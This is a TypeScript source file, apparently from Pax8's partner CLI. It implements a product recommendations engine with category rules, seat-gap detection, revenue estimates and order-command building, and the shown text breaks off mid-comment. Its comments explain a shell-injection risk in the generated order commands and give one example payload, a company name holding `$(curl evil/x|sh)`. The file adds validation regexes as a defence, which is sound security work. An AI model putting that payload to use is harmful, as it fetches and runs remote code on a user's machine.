// Copyright 2026 Pax8, Inc.
// SPDX-License-Identifier: Apache-2.0

/**
 * Recommendations engine — STAX / taxonomy divergence notice.
 *
 * The CLI's 7-category product taxonomy (`productivity`, `email`, `security`,
 * `endpoint_protection`, `identity`, `backup`, `cloud_infrastructure`) does
 * not match Pax8's canonical STAX taxonomy (8 L1 categories: Productivity,
 * Infrastructure, Continuity, Security, Communications, Network, Operations,
 * Network & Communications Commissioned). The CLI over-decomposes Security
 * into 4 categories and omits Communications, Network, and Operations
 * entirely. This was a deliberate simplification for the local recommendations
 * engine's security-focused cross-sell heuristic. When OE's first-party
 * recommendations API ships (ARC-785, `GET /opportunities`), this local
 * taxonomy sunsets. Pax8's STAX taxonomy is itself being replaced by a new
 * L1/L2/L3 hierarchical taxonomy (PCM team) — the CLI
 * should align to whichever taxonomy the OE API uses at sunset time. See:
 * Product Category (STAX) Layout, Product Taxonomy & Ontology PRD, and the
 * v0.2 follow-up issue (#375).
 *
 * Separately from product categories, the `opportunityType` field on
 * `Recommendation` carries OE's canonical 5-type opportunity taxonomy
 * (`Upsell`, `Cross-sell`, `Add-on`, `Upgrade`, `Net-new`). It was added
 * alongside (not replacing) the legacy `type` field, extending the
 * disclosure-over-rewrite pattern from #298/#299. Mapping:
 *   - `type: "cross_sell"` with at least one active sub → "Cross-sell"
 *   - `type: "cross_sell"` for a zero-sub company        → "Net-new"
 *   - `type: "seat_gap"`                                  → "Upsell"
 *     (in-stack expansion of an existing product, closest OE surrogate for
 *     the CLI's cross-product mismatch heuristic — still not equivalent to
 *     Pax8's canonical Seat Utilization, which is single-product
 *     assigned-vs-purchased.)
 */

import type { Subscription } from "../api/types.js";
import { subscriptionMrr } from "./analytics.js";

// ─── orderCommand safety ────────────────────────────────────────────────────
// The `orderCommand` string is the agent-facing handle to a recommendation —
// CLAUDE.md and skill.md both document the "extract orderCommand from
// recommendations list --json and run it" pattern, so the agent ends up
// being the unintentional executor of whatever value we interpolate here.
//
// Previously the constructed string was:
//   `pax8 orders create --company "${companyName}" --product ${productId} --quantity ${qty}`
//
// A `companyName` containing a literal `"` (or a name an upstream attacker
// or a compromised tenant directory entry could set) broke out of the
// double-quoted frame. The REPL tokenizer (`packages/cli/src/lib/repl.ts`)
// then re-parses the string into argv and `spawn`s `node` with the
// resulting array, which Commander dispatches with the *attacker-controlled*
// `--product` / `--quantity` overrides. The internal spawn is array-form
// (safe from OS shell injection) — what's at risk is Commander argument
// injection at the agent → REPL → orders create boundary.
//
// Fix: interpolate the `companyId` (a stable identifier with a strict
// character set) instead of the display name. We then validate every
// interpolated field as a "safe identifier" before composing the string;
// any field that fails validation produces `orderCommand: null` so an
// agent never gets a string it can't trust verbatim. Safe-identifier
// covers both Pax8 UUIDs (`a1b2c3d4-…`) and the `prod-…` test/demo IDs
// without admitting whitespace, quotes, or shell metacharacters.
const SAFE_ID_RE = /^[A-Za-z0-9_-]{1,128}$/;

function isSafeId(value: string | null | undefined): value is string {
  return typeof value === "string" && SAFE_ID_RE.test(value);
}

// Display names contain real-world punctuation: spaces, apostrophes,
// periods, ampersands (`AT&T`, `Procter & Gamble`, `Johnson & Johnson`),
// and occasionally `;` / `|` / `<` / `>` (rare but legitimate). What they
// MUST NOT contain is any character that breaks out of `--company
// "${companyName}"` in `buildOrderArtifacts`'s display string — that
// frame, plus a `bash -c '<orderCommand>'` evaluation, is what shell
// consumers see.
//
// Inside double-quoted shell strings, the only chars that break out are:
//   `"`        closes the double-quoted span
//   `\`        backslash escapes — could neutralize the closing quote
//   `` ` ``    backtick command substitution
//   `$`        `$VAR` / `$(...)` substitution
//   `\n` / `\r` literal newline ends the line
//   `\x00`     NUL (defensive)
//
// `;` `|` `&` `<` `>` are NOT special inside double quotes — they're
// literal text. The original H-2 gate also blocked those, but #509
// migrated the in-process consumers (REPL, recommendations act,
// recommendations list, dashboard) off the string form onto the
// spawn-safe `orderArgs` argv array, so the only remaining string-form
// consumer is an external agent shell-pasting `orderCommand` from
// `--json` output. That use case is shell-safe as long as the
// double-quote frame survives, so the gate can be narrowed to the chars
// that actually break the frame.
//
// Net effect: partners with legitimate `&`-containing display names
// (`AT&T` and friends) now produce non-null `orderCommand` /
// `orderArgs`, where before they collapsed to null. The argv form was
// always safe; the string form is now safe too.
//
// If you ever need to widen this: weigh the consumer audience. An
// internal consumer that re-tokenizes via a non-shell tokenizer (an
// agent that splits on whitespace ignoring quotes) is not the shell's
// problem to defend — that consumer should switch to `orderArgs`.
// eslint-disable-next-line no-control-regex -- \x00 is the intentional target: NUL in a display name should collapse to null.
const UNSAFE_DISPLAY_CHARS_RE = /["\\`$\n\r\x00]/;

function isSafeDisplayName(value: string | null | undefined): value is string {
  return typeof value === "string"
    && value.length > 0
    && value.length < 256
    && !UNSAFE_DISPLAY_CHARS_RE.test(value);
}

function isSafeQuantity(value: number | null | undefined): value is number {
  return typeof value === "number" && Number.isInteger(value) && value > 0 && value < 1_000_000;
}

// ─── Product Categories ─────────────────────────────────────────────────────
// Maps keyword patterns in product names to categories.
// A product can belong to multiple categories.

export type ProductCategory =
  | "productivity"
  | "email"
  | "security"
  | "endpoint_protection"
  | "identity"
  | "backup"
  | "cloud_infrastructure";

interface CategoryRule {
  category: ProductCategory;
  patterns: RegExp[];
}

const CATEGORY_RULES: CategoryRule[] = [
  {
    category: "productivity",
    patterns: [/microsoft 365/i, /office 365/i, /google workspace/i, /m365/i],
  },
  {
    category: "email",
    patterns: [/exchange online/i, /mimecast/i, /proofpoint/i, /barracuda.*email/i],
  },
  {
    category: "security",
    patterns: [/defender/i, /sentinel/i, /crowdstrike/i, /sophos/i, /bitdefender/i, /kaspersky/i, /norton/i, /webroot/i],
  },
  {
    category: "endpoint_protection",
    patterns: [/defender/i, /sentinel/i, /crowdstrike/i, /sophos.*endpoint/i, /bitdefender/i, /webroot/i],
  },
  {
    category: "identity",
    patterns: [/azure ad/i, /entra/i, /okta/i, /duo/i, /jumpcloud/i, /conditional access/i],
  },
  {
    category: "backup",
    patterns: [/acronis/i, /datto/i, /veeam/i, /backup/i, /arcserve/i, /carbonite/i, /axcient/i],
  },
  {
    category: "cloud_infrastructure",
    patterns: [/azure plan/i, /aws/i, /amazon web services/i, /google cloud/i],
  },
];

export const ALL_CATEGORIES: ProductCategory[] = [
  "productivity",
  "email",
  "security",
  "endpoint_protection",
  "identity",
  "backup",
  "cloud_infrastructure",
];

export function categorizeProduct(productName: string): ProductCategory[] {
  const categories: ProductCategory[] = [];
  for (const rule of CATEGORY_RULES) {
    if (rule.patterns.some((p) => p.test(productName))) {
      categories.push(rule.category);
    }
  }
  return categories;
}

// ─── Cross-sell Rules ───────────────────────────────────────────────────────
// "If a company has X but NOT Y, recommend Y"

interface CrossSellRule {
  ifHas: ProductCategory;
  butMissing: ProductCategory;
  reason: string;
  priority: "high" | "medium" | "low";
  suggestedProducts: string[]; // Product name keywords to search for
  /** Generic action title when no orderable product is available */
  genericTitle: string;
}

const CROSS_SELL_RULES: CrossSellRule[] = [
  {
    ifHas: "productivity",
    butMissing: "backup",
    reason: "No backup solution — SaaS data is not backed up by default. A single accidental deletion or ransomware event could cause permanent data loss.",
    priority: "high",
    suggestedProducts: ["AvePoint Cloud Backup for Microsoft 365", "Datto SaaS Protection", "Veeam Backup"],
    genericTitle: "Consider adding a backup solution",
  },
  {
    ifHas: "productivity",
    butMissing: "endpoint_protection",
    reason: "No endpoint protection — users with productivity suites are high-value targets for phishing and malware.",
    priority: "high",
    suggestedProducts: ["Microsoft Defender for Office 365 (Plan 1) [New Commerce Experience]", "CrowdStrike MSSP Complete Defend"],
    genericTitle: "Consider adding endpoint protection",
  },
  {
    ifHas: "productivity",
    butMissing: "identity",
    reason: "No identity management — without MFA and conditional access, compromised credentials are the #1 attack vector.",
    priority: "high",
    suggestedProducts: ["Microsoft Entra ID P1 [New Commerce Experience]", "JumpCloud"],
    genericTitle: "Consider adding identity management",
  },
  {
    ifHas: "email",
    butMissing: "security",
    reason: "Email without advanced security — email is the primary attack surface. Native filtering misses sophisticated threats.",
    priority: "medium",
    suggestedProducts: ["Microsoft Defender for Office 365 (Plan 1) [New Commerce Experience]", "Mimecast"],
    genericTitle: "Consider adding email security",
  },
  {
    ifHas: "cloud_infrastructure",
    butMissing: "backup",
    reason: "Cloud infrastructure without backup — cloud provider SLAs don't cover data loss from user error or ransomware.",
    priority: "medium",
    suggestedProducts: ["AvePoint Cloud Backup for Microsoft 365", "Veeam Backup"],
    genericTitle: "Consider adding a backup solution",
  },
  {
    ifHas: "cloud_infrastructure",
    butMissing: "security",
    reason: "Cloud infrastructure without security — workloads need threat detection and compliance monitoring.",
    priority: "medium",
    suggestedProducts: ["CrowdStrike MSSP Complete Defend", "SentinelOne Singularity Complete"],
    genericTitle: "Consider adding a security solution",
  },
  {
    ifHas: "security",
    butMissing: "backup",
    reason: "Security without backup — even with endpoint protection, ransomware recovery requires clean backups.",
    priority: "low",
    suggestedProducts: ["AvePoint Cloud Backup for Microsoft 365", "Datto SaaS Protection"],
    genericTitle: "Consider adding a backup solution",
  },
];

// ─── Seat Gap Detection ─────────────────────────────────────────────────────
// If a company has 85 M365 seats but only 20 backup seats, flag the gap.

interface SeatGap {
  baseProduct: string;
  baseQuantity: number;
  gapProduct: string;
  gapProductId: string;
  gapQuantity: number;
  missingSeats: number;
  category: ProductCategory;
}

function findSeatGaps(companySubs: SubscriptionInput[]): SeatGap[] {
  const gaps: SeatGap[] = [];

  const activeSubs = companySubs.filter((s) => s.status === "Active");
  if (activeSubs.length < 2) return gaps;

  // Group subs by category — only compare within the same category
  const byCategory = new Map<ProductCategory, SubscriptionInput[]>();
  for (const sub of activeSubs) {
    const cats = categorizeProduct(sub.productName ?? "");
    for (const cat of cats) {
      const list = byCategory.get(cat) ?? [];
      list.push(sub);
      byCategory.set(cat, list);
    }
  }

  // For each category with multiple products, find seat gaps
  for (const [category, catSubs] of byCategory) {
    if (catSubs.length < 2) continue;
    const sorted = [...catSubs].sort((a, b) => (b.quantity ?? 0) - (a.quantity ?? 0));
    const primary = sorted[0];
    const primaryQty = primary.quantity ?? 0;
    if (primaryQty < 10) continue; // Don't flag tiny deployments

    for (const sub of sorted.slice(1)) {
      const subQty = sub.quantity ?? 0;
      const ratio = subQty / primaryQty;
      const missing = primaryQty - subQty;
      // Flag if coverage is less than 50% and at least 10 seats missing
      if (ratio < 0.5 && missing >= 10) {
        gaps.push({
          baseProduct: primary.productName ?? "",
          baseQuantity: primaryQty,
          gapProduct: sub.productName ?? "",
          gapProductId: sub.productId ?? "",
          gapQuantity: subQty,
          missingSeats: missing,
          category,
        });
      }
    }
  }

  return gaps;
}

// ─── Public API ─────────────────────────────────────────────────────────────

/**
 * Loose input shape accepted by the recommendations engine. We use
 * `Omit<Partial<Subscription>, "status" | "billingTerm"> & {...}` rather than
 * a plain intersection so callers can pass rows whose `status` /
 * `billingTerm` are wider strings (e.g. demo-data rows or hand-built
 * objects from a script) without having to satisfy the strict literal
 * unions on `Subscription`.
 */
type SubscriptionInput = Omit<Partial<Subscription>, "status" | "billingTerm"> & {
  companyId?: string;
  productName?: string;
  companyName?: string;
  quantity?: number;
  status?: string;
  productId?: string;
  price?: number;
  billingTerm?: string;
};

/**
 * Pax8 Opportunity Explorer's canonical 5-type opportunity taxonomy.
 * Source: OX Help Center. Added as an additive axis on every recommendation
 * alongside the legacy `type` field, per the disclosure-over-rewrite pattern
 * from #298/#299. The full taxonomy alignment (CLI 7 product categories vs
 * STAX / PCM canon) is deferred to v0.2 (#375); this axis is the in-tree
 * portion of that alignment that can ship without waiting on ARC-785.
 */
export type OpportunityType =
  | "Upsell"
  | "Cross-sell"
  | "Add-on"
  | "Upgrade"
  | "Net-new";

export interface Recommendation {
  companyId: string;
  companyName: string;
  type: "cross_sell" | "seat_gap";
  /**
   * Pax8 Opportunity Explorer canonical opportunity type. Additive axis —
   * does not replace `type`. See the module-level doc comment for the
   * mapping between `type` and `opportunityType`.
   */
  opportunityType: OpportunityType;
  priority: "high" | "medium" | "low";
  title: string;
  reason: string;
  suggestedProducts: string[];
  /**
   * The exact CLI command to execute this recommendation.
   *
   * Informational / display-only. The string is built by interpolating the
   * upstream-controlled `companyName` (a value the partner-tenant owner could
   * influence via the customer record) into a shell template. It is safe to
   * print, but unsafe to hand to a shell verbatim — a malicious customer
   * name like `Acme" $(curl evil/x|sh) "` produces a working shell payload
   * once a user (or an LLM tool-using agent) pastes it into `bash -c`.
   *
   * Programmatic execution paths MUST use `orderArgs` instead. See #462.
   */
  orderCommand: string | null;
  /**
   * The same order as `orderCommand`, pre-tokenized as an argv-style array.
   * Safe to hand to `spawn()`/`execFile()`/the REPL tokenizer without any
   * shell involvement: the customer name (and any other interpolated value)
   * lands as a single argv element, so shell metacharacters cannot escape
   * out of it.
   *
   * `null` when `orderCommand` is `null` (no orderable product matched).
   * The first element is always the `pax8` argv0 so the array can be
   * dropped into `spawn("node", [cliPath, ...orderArgs.slice(1)])`.
   *
   * Prefer this field over `orderCommand` for any caller that intends to
   * execute the recommendation. See #462.
   */
  orderArgs: string[] | null;
  /** Whether the recommended product is available and orderable in the Pax8 catalog */
  productAvailable: boolean;
  /** Current MRR for this company */
  currentMrr: number;
  /** Estimated additional MRR if recommendation is adopted */
  estimatedMrrUplift: number | null;
  /** How many seats the recommendation targets */
  targetSeats: number | null;
  /** Indicates the MRR uplift estimate is an upper bound, not a forecast */
  estimateType: "upper_bound";
}

export interface RecommendationReport {
  recommendations: Recommendation[];
  totalCompanies: number;
  companiesWithGaps: number;
  estimatedTotalMrrUplift: number;
  /** Suggested products that could not be matched to any catalog product */
  unmatchedProducts: string[];
}

export interface CompanyCoverage {
  companyId: string;
  companyName: string;
  coveredCategories: ProductCategory[];
  missingCategories: ProductCategory[];
  coverage: string; // e.g. "3/7"
  estimatedUplift: number;
}

/**
 * Compute portfolio coverage per company: which of the 7 product categories
 * each company already has, which are missing, and estimated MRR uplift from
 * filling the gaps (using the recommendations engine).
 */
export function getPortfolioCoverage(
  subscriptions: SubscriptionInput[],
  recommendations?: Recommendation[],
): Map<string, CompanyCoverage> {
  const result = new Map<string, CompanyCoverage>();

  // Group active subs by company
  const byCompany = new Map<string, SubscriptionInput[]>();
  for (const sub of subscriptions) {
    if (sub.status !== "Active" || !sub.companyId) continue;
    const list = byCompany.get(sub.companyId) ?? [];
    list.push(sub);
    byCompany.set(sub.companyId, list);
  }

  // Aggregate recommendations uplift per company
  const upliftByCompany = new Map<string, number>();
  if (recommendations) {
    for (const rec of recommendations) {
      const existing = upliftByCompany.get(rec.companyId) ?? 0;
      upliftByCompany.set(rec.companyId, existing + (rec.estimatedMrrUplift ?? 0));
    }
  }

  for (const [companyId, subs] of byCompany) {
    const companyName = subs[0]?.companyName ?? companyId;
    const covered = new Set<ProductCategory>();
    for (const sub of subs) {
      const cats = categorizeProduct(sub.productName ?? "");
      for (const c of cats) covered.add(c);
    }

    const coveredCategories = ALL_CATEGORIES.filter((c) => covered.has(c));
    const missingCategories = ALL_CATEGORIES.filter((c) => !covered.has(c));

    result.set(companyId, {
      companyId,
      companyName,
      coveredCategories,
      missingCategories,
      coverage: `${coveredCategories.length}/${ALL_CATEGORIES.length}`,
      estimatedUplift: Number((upliftByCompany.get(companyId) ?? 0).toFixed(2)),
    });
  }

  return result;
}

// UUID-shape detector — the Pax8 API returns RFC-4122 UUIDs for company IDs.
// We use this to decide whether `companyId` is preferable to `companyName`
// for the `--company` value in the displayed `orderCommand` string. The
// argv form (`orderArgs`) always includes the name as a single argv element,
// so the safety story does not depend on this — but a UUID in the display
// string is one less surface that has to survive a copy-paste through a
// not-quite-careful shell.
const UUID_SHAPE_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

/**
 * Build the `orderCommand` display string and the matching `orderArgs`
 * argv-style array for an order-create recommendation.
 *
 * Display contract (`orderCommand`):
 *   - When `companyId` looks like a UUID, prefer it over `companyName` —
 *     UUIDs are inert under shell evaluation, and using one closes the
 *     `Acme" $(...) "`-style injection vector at the display layer too.
 *   - Otherwise (demo mode, legacy IDs that aren't UUIDs), fall back to
 *     `"${companyName}"`. The string is informational only — callers that
 *     intend to *execute* should use `orderArgs`. See #462.
 *
 * Argv contract (`orderArgs`):
 *   - First element is always `"pax8"` so the array can be dropped into a
 *     spawn() call or the REPL tokenizer verbatim.
 *   - The customer name lands as a single argv element regardless of which
 *     shell metacharacters it contains — no quoting, no escaping, no shell.
 *   - `--company` value carries the same identifier (UUID if available,
 *     else the name) as the display string, so the two forms stay in sync.
 */
function buildOrderArtifacts(
  companyId: string,
  companyName: string,
  productId: string,
  quantity: number,
): { orderCommand: string; orderArgs: string[] } {
  const useUuid = UUID_SHAPE_RE.test(companyId);
  const companyToken = useUuid ? companyId : companyName;
  // Display string: when we use the UUID, it's bare (no quotes); when we
  // fall back to the name, wrap in double quotes so a single-word display
  // still parses as one --company value if a user does paste it. The
  // safety story does not rely on this quoting — `orderArgs` is the
  // safe path.
  const companyDisplay = useUuid ? companyToken : `"${companyToken}"`;
  const orderCommand = `pax8 orders create --company ${companyDisplay} --product ${productId} --quantity ${quantity}`;
  const orderArgs = [
    "pax8",
    "orders",
    "create",
    "--company",
    companyToken,
    "--product",
    productId,
    "--quantity",
    String(quantity),
  ];
  return { orderCommand, orderArgs };
}

export function getRecommendations(
  subscriptions: SubscriptionInput[],
  products?: Array<{ id: string; name: string; vendorName?: string; pricing?: Array<{ billingTerm: string; suggestedRetailPrice: number }> }>,
  companies?: Array<{ id: string; name: string }>,
): RecommendationReport {
  // Group subscriptions by company
  const byCompany = new Map<string, SubscriptionInput[]>();
  for (const sub of subscriptions) {
    if (sub.status !== "Active" || !sub.companyId) continue;
    const list = byCompany.get(sub.companyId) ?? [];
    list.push(sub);
    byCompany.set(sub.companyId, list);
  }

  // Build product price lookup for MRR uplift estimates
  // Source 1: product catalog pricing (if available)
  const productPriceMap = new Map<string, number>();
  if (products) {
    for (const p of products) {
      const monthlyRate = p.pricing?.find((r) => r.billingTerm === "Monthly");
      if (monthlyRate) {
        productPriceMap.set(p.name.toLowerCase(), monthlyRate.suggestedRetailPrice);
      }
    }
  }
  // Source 2: actual subscription prices (always available, more accurate)
  for (const sub of subscriptions) {
    if (sub.status !== "Active") continue;
    const name = (sub.productName ?? "").toLowerCase();
    const price = sub.price ?? 0;
    if (name && price > 0 && !productPriceMap.has(name)) {
      productPriceMap.set(name, price);
    }
  }

  // Build a "peer product" lookup: for each category, find the most popular
  // product (by company count) already in use across the account.
  // Skip charity/non-profit/GCC/education SKUs as they aren't orderable for commercial customers.
  const RESTRICTED_PATTERNS = /non-profit|charity|gcc|education|faculty|student|government|\bAOS\b/i;

  const categoryProducts = new Map<ProductCategory, { productId: string; productName: string; count: number }>();
  for (const [, companySubs] of byCompany) {
    const seen = new Set<string>(); // dedupe per company
    for (const sub of companySubs) {
      const name = sub.productName ?? "";
      const pid = sub.productId ?? "";
      if (!pid || seen.has(pid)) continue;
      if (RESTRICTED_PATTERNS.test(name)) continue; // Skip restricted SKUs
      seen.add(pid);
      const cats = categorizeProduct(name);
      for (const cat of cats) {
        const existing = categoryProducts.get(cat);
        if (!existing || existing.count < 1) {
          categoryProducts.set(cat, { productId: pid, productName: name, count: (existing?.count ?? 0) + 1 });
        } else {
          existing.count++;
        }
      }
    }
  }

  const recommendations: Recommendation[] = [];
  const unmatchedProducts = new Set<string>();

  for (const [companyId, subs] of byCompany) {
    const companyName = subs[0]?.companyName ?? companyId;

    // Determine what categories this company already has
    const hasCategories = new Set<ProductCategory>();
    for (const sub of subs) {
      const cats = categorizeProduct(sub.productName ?? "");
      for (const c of cats) hasCategories.add(c);
    }

    // Calculate current MRR
    let currentMrr = 0;
    for (const sub of subs) {
      currentMrr += subscriptionMrr(sub.price ?? 0, sub.quantity ?? 0, sub.billingTerm ?? "Monthly");
    }

    // Check cross-sell rules
    for (const rule of CROSS_SELL_RULES) {
      if (hasCategories.has(rule.ifHas) && !hasCategories.has(rule.butMissing)) {
        // Estimate MRR uplift based on primary seat count
        const primaryQty = Math.max(...subs.map((s) => s.quantity ?? 0));
        let estimatedMrrUplift: number | null = null;
        const suggestedName = rule.suggestedProducts[0];
        if (suggestedName) {
          const price = productPriceMap.get(suggestedName.toLowerCase());
          if (price) {
            estimatedMrrUplift = price * primaryQty;
          }
        }

        // Find a matching product ID for the order command
        // Filter out restricted SKUs (non-profit, charity, GCC, education)
        let matchedProductId: string | null = null;
        const orderableProducts = products?.filter((p) => !RESTRICTED_PATTERNS.test(p.name));
        if (orderableProducts && suggestedName) {
          const sugLower = suggestedName.toLowerCase();
          // Try exact substring match first
          let match = orderableProducts.find((p) =>
            p.name.toLowerCase().includes(sugLower) ||
            sugLower.includes(p.name.toLowerCase())
          );
          // Fall back to keyword matching (all significant words must appear)
          if (!match) {
            const keywords = sugLower.split(/\s+/).filter((w) => w.length > 2);
            match = orderableProducts.find((p) => {
              const pLower = p.name.toLowerCase();
              return keywords.every((kw) => pLower.includes(kw));
            });
          }
          if (match) matchedProductId = match.id;
        }

        // Fall back to peer product if catalog match failed
        let resolvedProductName = suggestedName ?? rule.butMissing.replace(/_/g, " ");
        if (!matchedProductId) {
          const peer = categoryProducts.get(rule.butMissing);
          if (peer && peer.productId) {
            matchedProductId = peer.productId;
            resolvedProductName = peer.productName;
          }
        }

        // If initial price lookup failed but we resolved a real product name, retry lookup
        if (!estimatedMrrUplift && resolvedProductName) {
          const resolvedPrice = productPriceMap.get(resolvedProductName.toLowerCase());
          if (resolvedPrice) {
            estimatedMrrUplift = resolvedPrice * primaryQty;
          }
        }

        const productAvailable = matchedProductId !== null;
        if (!productAvailable && suggestedName) {
          unmatchedProducts.add(suggestedName);
        }
        // #462 + H-2: emit both an informational display string and a
        // safe argv array (#498's buildOrderArtifacts). Callers (REPL,
        // recommendations act, Claude skill) must execute via `orderArgs`
        // so an upstream-controlled customer name can never break out
        // into a shell substitution.
        //
        // We additionally gate the call on SAFE_ID_RE / isSafeQuantity
        // (#506) so that hostile values for `companyId`, `matchedProductId`,
        // or `primaryQty` collapse both forms to null. This is the
        // load-bearing control until `repl.ts`, `recommendations/list.ts`,
        // `recommendations/act.ts`, and `dashboard.ts` migrate from
        // tokenizing `orderCommand` to consuming `orderArgs` directly —
        // tracked as a follow-up. Until then, `buildOrderArtifacts` may
        // fall back to `--company "${companyName}"` (when companyId is
        // not UUID-shaped), and a hostile name inside that quote frame
        // would break the REPL tokenizer.
        const artifacts =
          matchedProductId &&
          isSafeId(companyId) &&
          isSafeId(matchedProductId) &&
          isSafeQuantity(primaryQty) &&
          isSafeDisplayName(companyName)
            ? buildOrderArtifacts(companyId, companyName, matchedProductId, primaryQty)
            : null;
        const orderCommand = artifacts?.orderCommand ?? null;
        const orderArgs = artifacts?.orderArgs ?? null;

        // Demote to medium priority when the product isn't available/orderable
        const effectivePriority: "high" | "medium" | "low" = productAvailable
          ? rule.priority
          : rule.priority === "high"
            ? "medium"
            : rule.priority;

        // Use generic title when product isn't available; specific title when it is
        const title = productAvailable
          ? `Add ${resolvedProductName} for ${companyName}`
          : `${rule.genericTitle} for ${companyName}`;

        recommendations.push({
          companyId,
          companyName,
          type: "cross_sell",
          // Company has at least one active sub (it matched at least one
          // `ifHas` category), so the canonical OE motion is Cross-sell —
          // adding a complementary product category to an existing stack.
          opportunityType: "Cross-sell",
          priority: effectivePriority,
          title,
          reason: rule.reason,
          suggestedProducts: [resolvedProductName, ...rule.suggestedProducts.slice(1)],
          orderCommand,
          orderArgs,
          productAvailable,
          currentMrr: Number(currentMrr.toFixed(2)),
          estimatedMrrUplift: estimatedMrrUplift !== null ? Number(estimatedMrrUplift.toFixed(2)) : null,
          targetSeats: primaryQty,
          estimateType: "upper_bound",
        });
      }
    }

    // Check seat gaps
    const gaps = findSeatGaps(subs);
    for (const gap of gaps) {
      const price = productPriceMap.get(gap.gapProduct.toLowerCase());
      const estimatedMrrUplift = price ? price * gap.missingSeats : null;

      // For seat gaps, use the product ID directly from the subscription.
      // See buildOrderArtifacts (#462) for the shell-injection rationale
      // and the cross-sell branch above for the SAFE_ID_RE gate (#506).
      // Same gate applied here for symmetry.
      const seatArtifacts =
        gap.gapProductId &&
        isSafeId(companyId) &&
        isSafeId(gap.gapProductId) &&
        isSafeQuantity(gap.missingSeats) &&
        isSafeDisplayName(companyName)
          ? buildOrderArtifacts(companyId, companyName, gap.gapProductId, gap.missingSeats)
          : null;
      const orderCommand = seatArtifacts?.orderCommand ?? null;
      const orderArgs = seatArtifacts?.orderArgs ?? null;

      recommendations.push({
        companyId,
        companyName,
        type: "seat_gap",
        // Seat-gap is in-stack expansion of an existing product — the closest
        // OE surrogate is Upsell. Still not equivalent to Pax8's canonical
        // Seat Utilization (single-product assigned-vs-purchased); see #298
        // and the module doc.
        opportunityType: "Upsell",
        priority: gap.missingSeats > 20 ? "high" : "medium",
        // Wording disambiguates from Pax8's canonical "Seat Utilization"
        // metric, which is single-product assigned-vs-purchased. This
        // heuristic is cross-product mismatch coverage. See #298.
        title: `${gap.missingSeats} mismatched seats: ${gap.gapProduct} (${gap.gapQuantity}/${gap.baseQuantity})`,
        reason: `${gap.baseProduct} covers ${gap.baseQuantity} seats but ${gap.gapProduct} only covers ${gap.gapQuantity}. ${gap.missingSeats} seats are unprotected.`,
        suggestedProducts: [gap.gapProduct],
        orderCommand,
        orderArgs,
        productAvailable: true, // seat gaps reference products already in use
        currentMrr: Number(currentMrr.toFixed(2)),
        estimatedMrrUplift: estimatedMrrUplift !== null ? Number(estimatedMrrUplift.toFixed(2)) : null,
        targetSeats: gap.missingSeats,
        estimateType: "upper_bound",
      });
    }
  }

  // Flag companies with zero active subscriptions
  if (companies) {
    for (const company of companies) {
      if (!byCompany.has(company.id)) {
        recommendations.push({
          companyId: company.id,
          companyName: company.name,
          // Legacy `type` stays `cross_sell` — this is the closest existing
          // surrogate in the 2-value union. The full `seat_gap`/`cross_sell`
          // → OE 5-type migration is deferred to v0.2 (#375). The new
          // `opportunityType` axis carries the correct value today.
          type: "cross_sell",
          // Zero active subs → no existing stack to cross-sell into.
          // Canonical OE motion is Net-new. This corrects the surprise the
          // triage doc surfaced (see surprise #7 in
          // `docs/triage/recommendations-conformance.md`): the company was
          // being labeled Cross-sell when there was nothing to cross from.
          opportunityType: "Net-new",
          priority: "high",
          title: `No active subscriptions for ${company.name}`,
          reason: "This customer has no active subscriptions. Consider reaching out to discuss their needs.",
          suggestedProducts: [],
          orderCommand: null,
          orderArgs: null,
          productAvailable: false,
          currentMrr: 0,
          estimatedMrrUplift: null,
          targetSeats: null,
          estimateType: "upper_bound",
        });
      }
    }
  }

  // Deduplicate: if the same company + missing category appears from multiple rules, keep highest priority
  const seen = new Set<string>();
  const deduped: Recommendation[] = [];
  for (const rec of recommendations) {
    // For cross-sell, dedupe by company + suggested category (from title)
    // For seat_gap, dedupe by company + product
    const key = `${rec.companyId}:${rec.type}:${rec.title}`;
    if (!seen.has(key)) {
      seen.add(key);
      deduped.push(rec);
    }
  }

  // Sort: high priority first, then by estimated MRR uplift descending
  const priorityOrder = { high: 0, medium: 1, low: 2 };
  deduped.sort((a, b) => {
    const pDiff = priorityOrder[a.priority] - priorityOrder[b.priority];
    if (pDiff !== 0) return pDiff;
    return (b.estimatedMrrUplift ?? 0) - (a.estimatedMrrUplift ?? 0);
  });

  // Count total companies: union of companies with subs + companies passed in
  const allCompanyIds = new Set(byCompany.keys());
  if (companies) {
    for (const c of companies) allCompanyIds.add(c.id);
  }

  const companiesWithGaps = new Set(deduped.map((r) => r.companyId)).size;
  const estimatedTotalMrrUplift = Number(deduped.reduce((sum, r) => sum + (r.estimatedMrrUplift ?? 0), 0).toFixed(2));

  return {
    recommendations: deduped,
    totalCompanies: allCompanyIds.size,
    companiesWithGaps,
    estimatedTotalMrrUplift,
    unmatchedProducts: [...unmatchedProducts],
  };
}

// ─── Upsell Cohort Finder ───────────────────────────────────────────────────
//
// Composition over `get_subscriptions` + `get_companies` (+ optional
// `get_contacts`) that answers a single question:
//   "Which companies have product A but NOT product B?"
//
// Follows the MCP "Proactive Upsell Opportunity Finder" pattern (MCP Guide
// 3b) — Pax8's canonical composition for the upsell workflow. The MCP server
// composes this from get_subscriptions / get_companies / get_contacts; we
// mirror it locally over the same inputs so it works under PAX8_DEMO=1 and
// over the live API alike.
//
// This is intentionally distinct from `getRecommendations()`: the cross-sell
// engine works on inferred product *categories*, while this finder works on
// explicit product *identities* the user names on the command line. It is
// the canonical Pax8 workflow when a partner has a specific upsell motion in
// mind (e.g. "everyone on M365 Business Basic who doesn't have E3").

export interface UpsellMatch {
  companyId: string;
  companyName: string;
  /** The subscription(s) for the `--from-product` that qualify this company */
  fromSubscriptions: Array<{
    subscriptionId: string | undefined;
    productId: string | undefined;
    productName: string;
    quantity: number;
    price: number;
    billingTerm: string;
  }>;
  /** Total seats currently on the `--from-product` (sum across qualifying subs) */
  fromSeats: number;
  /** Current MRR contribution from the `--from-product` subscriptions */
  fromMrr: number;
  /**
   * Contact emails on file for the company, when contacts were supplied.
   * Empty when no contacts were provided to the finder.
   */
  contacts: Array<{ name: string; email: string }>;
  /**
   * OE canonical opportunity type — always `"Upsell"` for this finder: the
   * partner is moving an existing customer up a product tier, not adding a
   * new category or net-new customer.
   */
  opportunityType: "Upsell";
}

export interface UpsellCohortReport {
  fromProduct: string;
  toProduct: string;
  /** Companies that have `--from-product` and DO NOT have `--to-product`. */
  matches: UpsellMatch[];
  /** Total seats across all qualifying companies (sum of `fromSeats`). */
  totalFromSeats: number;
  /** Total MRR currently on the from-product across the cohort. */
  totalFromMrr: number;
  /**
